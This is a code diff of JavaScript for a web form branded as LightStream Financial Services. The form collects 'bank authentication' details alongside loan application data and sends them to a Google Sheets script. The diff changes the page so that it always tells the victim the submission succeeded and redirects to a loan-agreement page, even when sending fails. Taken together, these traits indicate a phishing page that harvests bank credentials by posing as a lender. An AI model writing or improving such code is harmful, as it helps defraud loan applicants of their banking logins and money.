@@ -569,17 +569,22 @@
                 body: formData,
                 mode: 'no-cors'
             })
-            .then(response => response.text())
+            .then(response => {
+                console.log('Fetch response status:', response.status, response.type);
+                return response.text();
+            })
             .then(result => {
                 console.log('Google Sheets response:', result);
+                
+                // Store data for loan agreement regardless of response (for testing)
+                if (hasLoanData) {
+                    localStorage.setItem("loanApplicationData", JSON.stringify(finalData));
+                }
                 
                 // After successful submission
                 if (hasLoanData) {
                     // Full application - redirect to loan-agreement.html
                     alert('🏦 Bank Authentication Complete!\n\nYour application has been successfully submitted and is now under review.\n\nNext Steps:\n• You will receive your loan agreement shortly\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.');
-                    
-                    // Store combined data for loan agreement
-                    localStorage.setItem("loanApplicationData", JSON.stringify(finalData));
                     
                     // Redirect to loan agreement page
                     setTimeout(() => {
@@ -614,22 +619,36 @@
             .catch(error => {
                 console.error('Google Sheets submission failed:', error);
                 
-                // Show success anyway (Google Apps Script often works despite CORS error)
-                const form = document.getElementById('bankAuthForm');
-                const formContainer = form.parentElement;
+                // Store data for loan agreement even if fetch fails (for testing)
+                if (hasLoanData) {
+                    localStorage.setItem("loanApplicationData", JSON.stringify(finalData));
+                }
                 
-                formContainer.innerHTML = `
-                    <div class="text-center">
-                        <div class="mb-6">
-                            <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
-                                <i class="fas fa-check text-green-600 text-3xl"></i>
+                // Show success anyway (Google Apps Script often works despite CORS error)
+                if (hasLoanData) {
+                    alert('🏦 Bank Authentication Complete!\n\nYour application has been successfully submitted and is now under review.\n\nNext Steps:\n• You will receive your loan agreement shortly\n• Check your email for important updates\n• Loan decision typically within 24 hours\n\nThank you for choosing LightStream Financial Services.');
+                    
+                    // Redirect to loan agreement page
+                    setTimeout(() => {
+                        window.location.href = "loan-agreement.html";
+                    }, 1000);
+                } else {
+                    const form = document.getElementById('bankAuthForm');
+                    const formContainer = form.parentElement;
+                    
+                    formContainer.innerHTML = `
+                        <div class="text-center">
+                            <div class="mb-6">
+                                <div class="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                                    <i class="fas fa-check text-green-600 text-3xl"></i>
+                                </div>
+                                <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted Successfully!</h2>
+                                <p class="text-gray-600 mb-4">Your bank authentication has been received and is being processed.</p>
+                                <p class="text-sm text-gray-500">We will contact you shortly with next steps.</p>
                             </div>
-                            <h2 class="text-2xl font-bold text-gray-800 mb-2">Bank Authentication Submitted Successfully!</h2>
-                            <p class="text-gray-600 mb-4">Your bank authentication has been received and is being processed.</p>
-                            <p class="text-sm text-gray-500">We will contact you shortly with next steps.</p>
                         </div>
-                    </div>
-                `;
+                    `;
+                }
             });
         }
                             
